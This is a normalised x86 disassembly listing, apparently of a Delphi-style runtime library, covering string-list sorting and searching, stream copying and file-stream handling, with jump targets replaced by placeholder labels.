push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415151
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404114
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415c28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415158
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_415164
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40550c
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415198
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4151db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40404c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4151e2
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_4151e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41529c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor edx edx
push ebp
push sub_41527f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415286
mov eax [ ebp - 0x4 ]
call sub_414890
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f44
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_4152ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415322
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_419530
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_419538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415329
lea eax [ ebp - 0xc ]
call sub_403e54
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4195d8
inc esi
dec ebx
jne r-xdata
sub_415354
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415370
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41460c
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4048dc
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4153d8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414988
jmp r-xdata
sub_415474
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_4048dc
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4154b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_4049c8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_415520
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414988
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41557c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41557c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_4155a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415618
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403ea8
pop edi
pop esi
pop ebx
retn
sub_415654
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41567c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_4156b0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414c50
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4156fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414988
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415750
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41567c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403ea8
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_4157c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414988
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403ea8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415824
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414988
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41557c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415864
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415914
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415970
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415864
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4159c4
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4159f8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415a5c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_415ab0
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403054
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
mov esp ebp
pop ebp
retn
sub_415afc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40304c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_415ab0
pop ecx
mov eax [ ebx ]
call sub_403090
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_415ab0
pop ecx
sub_415b80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_415bf0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
sub_415c28
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
sub_415c60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_4159e4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415d3c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d43
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_415bf0
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415c28
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415d54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416508
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415da4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41853c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415dab
mov eax [ ebp - 0x8 ]
call sub_403104
retn
sub_415db4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_415e10
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40829c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415e50
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cbb8
pop ebx
pop ebp
retn 0x8
sub_415e78
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415ebc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_415ebc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415fe5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403428
movzx edx di
mov eax esi
call sub_4081c0
mov ecx eax
xor edx edx
mov eax ebx
call sub_415db4
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40823c
mov ecx eax
xor edx edx
mov eax ebx
call sub_415db4
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415fec
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403e78
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408454
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ad18
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408454
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ad18
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
jmp r-xdata
sub_415fec
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_416010
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
call sub_4082d4
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41604c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416084
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_4160a8
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_4160d4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4160ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_4159e4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_415bf0
sub_416124
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_416044
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41614c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_416124
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416178
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_40680c
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_4067f0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_4067e0
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
test ecx ecx
